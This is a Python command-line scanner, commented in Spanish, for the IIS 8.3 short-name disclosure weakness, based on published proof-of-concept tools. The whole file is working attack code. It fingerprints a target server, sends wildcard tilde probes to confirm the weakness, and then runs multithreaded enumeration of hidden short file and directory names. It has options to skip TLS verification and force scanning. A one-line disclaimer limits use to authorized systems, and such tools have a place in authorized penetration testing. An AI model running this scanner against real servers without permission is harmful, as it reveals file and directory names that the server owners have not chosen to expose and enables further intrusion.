#!/usr/bin/env python3
# encoding: utf-8
"""
IIS 8.3 short name disclosure scanner — todo en un archivo.

Lógica de barrido alineada con:
  https://github.com/lijiejie/IIS_shortname_Scanner (iis_shortname_scan.py)

PoC / referencia histórica:
  https://github.com/irsdl/IIS-ShortName-Scanner

Solo usa esta herramienta en sistemas autorizados.
"""
from __future__ import annotations

import argparse
import http.client
import json
import logging
import queue
import re
import ssl
import sys
import threading
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table

    _RICH = True
except ImportError:  # pragma: no cover
    _RICH = False

__version__ = "3.1.0"

ALPHANUM = "abcdefghijklmnopqrstuvwxyz0123456789_-"
EXT_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"
VULN_METHODS = ("GET", "OPTIONS")
IIS_RE = re.compile(r"microsoft-iis/(\d+\.\d+)", re.I)
log = logging.getLogger("iis8.3")


# ---------------------------------------------------------------------------
# Modelos
# ---------------------------------------------------------------------------


@dataclass
class ProbeRecord:
    method: str
    path: str
    status: int | None = None
    error: str | None = None


@dataclass
class Fingerprint:
    server: str | None = None
    x_powered_by: str | None = None
    x_aspnet_version: str | None = None
    iis_version: str | None = None
    is_iis: bool = False
    aspnet: bool = False
    allow_methods: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


@dataclass
class VulnResult:
    vulnerable: bool
    preferred_method: str
    confidence: float
    probes: list[ProbeRecord] = field(default_factory=list)
    message: str = ""


@dataclass
class ScanStats:
    http_requests: int = 0
    http_errors: int = 0


@dataclass
class ScanOutcome:
    version: str
    target: str
    started_at: str
    finished_at: str
    duration_s: float
    fingerprint: Fingerprint
    vuln: VulnResult
    directories: list[str]
    files: list[str]
    stats: ScanStats
    warnings: list[str]
    errors: list[str]


# ---------------------------------------------------------------------------
# HTTP (http.client — mismo estilo que lijiejie)
# ---------------------------------------------------------------------------


class HttpCaller:
    def __init__(
        self,
        scheme: str,
        netloc: str,
        *,
        verify_tls: bool,
        timeout: float | None,
        stats: ScanStats,
    ) -> None:
        self.scheme = scheme
        self.netloc = netloc
        self.verify_tls = verify_tls
        self.timeout = timeout
        self.stats = stats
        self._ssl: ssl.SSLContext | None = None
        if scheme == "https":
            ctx = ssl.create_default_context()
            if not verify_tls:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            self._ssl = ctx

    def request(self, method: str, path: str) -> int:
        self.stats.http_requests += 1
        conn: http.client.HTTPConnection
        kw: dict[str, Any] = {}
        if self.timeout is not None:
            kw["timeout"] = self.timeout
        try:
            if self.scheme == "https":
                conn = http.client.HTTPSConnection(
                    self.netloc, context=self._ssl, **kw
                )
            else:
                conn = http.client.HTTPConnection(self.netloc, **kw)
            conn.request(method, path)
            status = conn.getresponse().status
            conn.close()
            return status
        except Exception as exc:
            self.stats.http_errors += 1
            raise RuntimeError(f"{method} {path}: {exc}") from exc


# ---------------------------------------------------------------------------
# Motor de escaneo (control de flujo idéntico a lijiejie + drenado seguro)
# ---------------------------------------------------------------------------


class ShortNameScanner:
    """
    Enumeración 8.3.

    Regla crítica (PoC original): al llegar a 6 caracteres con ext ``.*`` hay que
    encolar ``(url, "")`` *y*, en el mismo paso si sigue siendo ``.*``, entrar
    en el ``else`` de extensiones (``.a*``, ``.b*``, …). No encadenar con ``elif``
  tras ``if ext == '.*'``.
    """

    def __init__(
        self,
        raw_target: str,
        *,
        threads: int = 20,
        verify_tls: bool = True,
        timeout: float | None = None,
        delay: float = 0.0,
        quiet: bool = False,
        stats: ScanStats | None = None,
    ) -> None:
        self.target = raw_target.strip()
        if not self.target.lower().startswith(("http://", "https://")):
            self.target = "http://" + self.target
        self.target = self.target.lower()

        # Fix respecto al original: urlparse sobre URL ya normalizada.
        self.scheme, self.netloc, self.path, *_ = urlparse(self.target)
        if self.path[-1:] != "/":
            self.path += "/"

        self.threads = max(1, threads)
        self.delay = max(0.0, delay)
        self.quiet = quiet
        self.stats = stats or ScanStats()
        self.http = HttpCaller(
            self.scheme,
            self.netloc,
            verify_tls=verify_tls,
            timeout=timeout,
            stats=self.stats,
        )

        self.files: list[str] = []
        self.dirs: list[str] = []
        self._q: queue.Queue[tuple[str, str]] = queue.Queue()
        self._lock = threading.Lock()
        self._msg_q: queue.Queue[str] = queue.Queue()
        self._printer_stop = False
        self._shutdown = threading.Event()
        self._inflight = 0
        self._inflight_lock = threading.Lock()
        self.request_method = "GET"
        self.scan_errors: list[str] = []

    def _get_status(self, path: str) -> int:
        if self.delay:
            time.sleep(self.delay)
        return self.http.request(self.request_method, path)

    def _enqueue_msg(self, text: str) -> None:
        if not self.quiet:
            self._msg_q.put(text)

    def _printer(self) -> None:
        while not self._printer_stop or not self._msg_q.empty():
            if self._msg_q.empty():
                time.sleep(0.05)
            else:
                print(self._msg_q.get(), flush=True)

    def fingerprint(self) -> Fingerprint:
        fp = Fingerprint()
        try:
            status = self.http.request("GET", self.path if self.path != "/" else "/")
        except RuntimeError as exc:
            fp.notes.append(f"No se pudo leer la raíz: {exc}")
            return fp

        # Cabeceras no disponibles con http.client sin guardar respuesta;
        # segunda petición con conexión dedicada.
        conn: http.client.HTTPConnection
        kw: dict[str, Any] = {}
        if self.http.timeout is not None:
            kw["timeout"] = self.http.timeout
        try:
            if self.scheme == "https":
                conn = http.client.HTTPSConnection(
                    self.netloc, context=self.http._ssl, **kw
                )
            else:
                conn = http.client.HTTPConnection(self.netloc, **kw)
            conn.request("GET", self.path)
            resp = conn.getresponse()
            headers = {k.lower(): v for k, v in resp.getheaders()}
            conn.close()
        except Exception as exc:
            fp.notes.append(f"Fingerprint parcial: {exc}")
            headers = {}

        fp.server = headers.get("server")
        fp.x_powered_by = headers.get("x-powered-by")
        fp.x_aspnet_version = headers.get("x-aspnet-version")
        if fp.server:
            m = IIS_RE.search(fp.server)
            fp.iis_version = m.group(1) if m else None
        fp.is_iis = bool(
            fp.iis_version or (fp.server and "microsoft-iis" in fp.server.lower())
        )
        fp.aspnet = bool(
            fp.x_aspnet_version
            or (fp.x_powered_by and "asp.net" in fp.x_powered_by.lower())
        )
        allow = headers.get("allow", "")
        if allow:
            fp.allow_methods = [x.strip().upper() for x in allow.split(",")]

        if fp.is_iis and fp.iis_version:
            fp.notes.append(f"IIS {fp.iis_version}")
        elif fp.is_iis:
            fp.notes.append("Microsoft-IIS")
        else:
            fp.notes.append("No parece IIS")

        _ = status  # usado en versión futura si se correlaciona con auth
        return fp

    def check_vulnerable(self, *, verbose: bool = False) -> VulnResult:
        """
        Probes del README de lijiejie:
          {path}/*~1*/a.aspx     → debe dar 404 (coincidencia)
          {path}/l1j1e*~1*/a.aspx → no debe dar 404
        """
        probes: list[ProbeRecord] = []
        best_method = "GET"
        best_conf = 0.0
        vulnerable = False

        exist_suffix = "/*~1*/a.aspx"
        missing_suffix = "/l1j1e*~1*/a.aspx"

        for method in VULN_METHODS:
            self.request_method = method
            path_exist = self.path + exist_suffix
            path_miss = self.path + missing_suffix
            try:
                s1 = self._get_status(path_exist)
                rec1 = ProbeRecord(method, path_exist, s1)
            except RuntimeError as exc:
                rec1 = ProbeRecord(method, path_exist, None, str(exc))
                s1 = None
            try:
                s2 = self._get_status(path_miss)
                rec2 = ProbeRecord(method, path_miss, s2)
            except RuntimeError as exc:
                rec2 = ProbeRecord(method, path_miss, None, str(exc))
                s2 = None
            probes.extend([rec1, rec2])
            if verbose:
                log.info("%s exist=%s missing=%s", method, s1, s2)

            if s1 == 404 and s2 is not None and s2 != 404:
                vulnerable = True
                conf = 0.95 if method == "GET" else 0.92
                if conf > best_conf:
                    best_conf = conf
                    best_method = method

        if not vulnerable:
            return VulnResult(
                False,
                "GET",
                0.0,
                probes,
                "Patrón 404 / no-404 no observado.",
            )

        self.request_method = best_method
        return VulnResult(
            True,
            best_method,
            best_conf,
            probes,
            f"Vulnerable (método {best_method}, confianza {best_conf:.0%}).",
        )

    def _handle_hit(self, url: str, ext: str) -> None:
        """Lógica lijiejie (2016-10-27) — no compactar en elif."""
        self._enqueue_msg(f"[+] {url}~1{ext}\t[scan in progress]")

        if len(url) - len(self.path) < 6:
            for c in ALPHANUM:
                self._q.put((url + c, ext))
            return

        if ext == ".*":
            self._q.put((url, ""))

        if ext == "":
            name = url + "~1"
            with self._lock:
                if name not in self.dirs:
                    self.dirs.append(name)
            self._enqueue_msg(f"[+] Directory {name}\t[Done]")
        elif len(ext) == 5 or (not ext.endswith("*")):
            name = url + "~1" + ext
            with self._lock:
                if name not in self.files:
                    self.files.append(name)
            self._enqueue_msg(f"[+] File {name}\t[Done]")
        else:
            for c in EXT_CHARS:
                self._q.put((url, ext[:-1] + c + "*"))
                if len(ext) < 4:
                    self._q.put((url, ext[:-1] + c))

    def _worker(self) -> None:
        while not self._shutdown.is_set():
            try:
                url, ext = self._q.get(timeout=0.5)
            except queue.Empty:
                continue

            with self._inflight_lock:
                self._inflight += 1
            try:
                path = url + "*~1" + ext + "/1.aspx"
                try:
                    status = self._get_status(path)
                except RuntimeError as exc:
                    if len(self.scan_errors) < 300:
                        self.scan_errors.append(str(exc))
                    continue

                if status == 404:
                    self._handle_hit(url, ext)
            finally:
                with self._inflight_lock:
                    self._inflight -= 1
                self._q.task_done()

    def run_scan(self, *, idle_seconds: float = 3.0) -> None:
        """Barrido concurrente con drenado de cola fiable."""
        threading.Thread(target=self._printer, daemon=True).start()

        for c in ALPHANUM:
            self._q.put((self.path + c, ".*"))

        workers = [
            threading.Thread(target=self._worker, name=f"w{i}", daemon=True)
            for i in range(self.threads)
        ]
        for t in workers:
            t.start()

        idle_start: float | None = None
        while not self._shutdown.is_set():
            pending = self._q.unfinished_tasks
            with self._inflight_lock:
                busy = self._inflight > 0

            if pending == 0 and not busy:
                if idle_start is None:
                    idle_start = time.monotonic()
                elif time.monotonic() - idle_start >= idle_seconds:
                    break
            else:
                idle_start = None
            time.sleep(0.15)

        self._shutdown.set()
        self._q.join()
        for t in workers:
            t.join(timeout=10)

        self._printer_stop = True
        time.sleep(0.2)

    def report_text(self) -> None:
        print("-" * 64)
        for d in self.dirs:
            print(f"Dir:  {d}")
        for f in self.files:
            print(f"File: {f}")
        print("-" * 64)
        print(
            f"{len(self.dirs)} Directories, {len(self.files)} Files found in total"
        )
        print(
            "Note that * is a wildcard, matches any character zero or more times."
        )


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def _setup_logging(verbosity: int) -> None:
    level = logging.WARNING
    if verbosity >= 1:
        level = logging.INFO
    if verbosity >= 2:
        level = logging.DEBUG
    logging.basicConfig(
        level=level,
        format="%(levelname)s: %(message)s",
    )


def _rich_summary(outcome: ScanOutcome) -> None:
    if not _RICH:
        print(f"\n{outcome.vuln.message}")
        for n in outcome.fingerprint.notes:
            print(f"  • {n}")
        return
    console = Console()
    console.print(
        Panel.fit(
            f"[bold]IIS Short Name Scanner[/] v{outcome.version}\n"
            f"Target: {outcome.target}\n"
            f"Tiempo: {outcome.duration_s:.1f}s | HTTP: {outcome.stats.http_requests}",
        )
    )
    t = Table(show_header=False, box=None, title="Fingerprint")
    t.add_row("Server", outcome.fingerprint.server or "—")
    t.add_row("IIS", outcome.fingerprint.iis_version or str(outcome.fingerprint.is_iis))
    t.add_row("Vuln check", outcome.vuln.message)
    for note in outcome.fingerprint.notes:
        t.add_row("", note)
    console.print(t)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="IIS 8.3 short name scanner (monolítico, basado en lijiejie).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("url", help="URL base, p.ej. http://10.0.0.5/ o http://host/app/")
    p.add_argument("-t", "--threads", type=int, default=20)
    p.add_argument(
        "--timeout",
        type=float,
        default=None,
        help="Timeout de socket (None = como el script original)",
    )
    p.add_argument("-k", "--insecure", action="store_true", help="TLS sin verificar")
    p.add_argument("--delay", type=float, default=0.0, help="Pausa entre peticiones")
    p.add_argument(
        "--method",
        choices=("auto", "GET", "OPTIONS"),
        default="auto",
        help="Método HTTP para el barrido",
    )
    p.add_argument("-q", "--quiet", action="store_true", help="Sin progreso en vivo")
    p.add_argument("-v", "--verbose", action="count", default=0)
    p.add_argument("-o", "--output", help="JSON con el informe completo")
    p.add_argument("--skip-check", action="store_true", help="Omitir chequeo de vuln")
    p.add_argument("--skip-fingerprint", action="store_true")
    p.add_argument(
        "--force",
        action="store_true",
        help="Escanear aunque el chequeo falle",
    )
    p.add_argument(
        "--idle",
        type=float,
        default=3.0,
        help="Segundos con cola vacía antes de finalizar",
    )
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    _setup_logging(args.verbose)

    started = datetime.now(timezone.utc)
    t0 = time.perf_counter()
    warnings: list[str] = []
    stats = ScanStats()

    try:
        scanner = ShortNameScanner(
            args.url,
            threads=args.threads,
            verify_tls=not args.insecure,
            timeout=args.timeout,
            delay=args.delay,
            quiet=args.quiet,
            stats=stats,
        )
    except Exception as exc:
        print(f"URL inválida: {exc}", file=sys.stderr)
        return 2

    if args.skip_fingerprint:
        fp = Fingerprint(notes=["Fingerprint omitido"])
    else:
        fp = scanner.fingerprint()

    if not fp.is_iis:
        warnings.append("El objetivo no parece IIS (usa --force para continuar).")

    if args.skip_check:
        vuln = VulnResult(
            True,
            "GET" if args.method != "auto" else "GET",
            0.5,
            [],
            "Chequeo omitido.",
        )
    else:
        vuln = scanner.check_vulnerable(verbose=args.verbose >= 1)

    if args.method != "auto":
        scanner.request_method = args.method
        if vuln.vulnerable:
            vuln.preferred_method = args.method

    if not vuln.vulnerable and not args.force and not args.skip_check:
        outcome = ScanOutcome(
            __version__,
            scanner.target,
            started.isoformat(),
            datetime.now(timezone.utc).isoformat(),
            time.perf_counter() - t0,
            fp,
            vuln,
            [],
            [],
            stats,
            warnings,
            [],
        )
        print("Server is not vulnerable")
        _rich_summary(outcome)
        if args.output:
            with open(args.output, "w", encoding="utf-8") as fh:
                json.dump(asdict(outcome), fh, indent=2, ensure_ascii=False)
        return 1

    if vuln.vulnerable:
        scanner.request_method = vuln.preferred_method

    print("Server is vulnerable, please wait, scanning...")
    scanner.run_scan(idle_seconds=args.idle)
    scanner.report_text()

    outcome = ScanOutcome(
        __version__,
        scanner.target,
        started.isoformat(),
        datetime.now(timezone.utc).isoformat(),
        time.perf_counter() - t0,
        fp,
        vuln,
        list(scanner.dirs),
        list(scanner.files),
        stats,
        warnings,
        scanner.scan_errors,
    )
    _rich_summary(outcome)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            json.dump(asdict(outcome), fh, indent=2, ensure_ascii=False)
    return 0


if __name__ == "__main__":
    sys.exit(main())
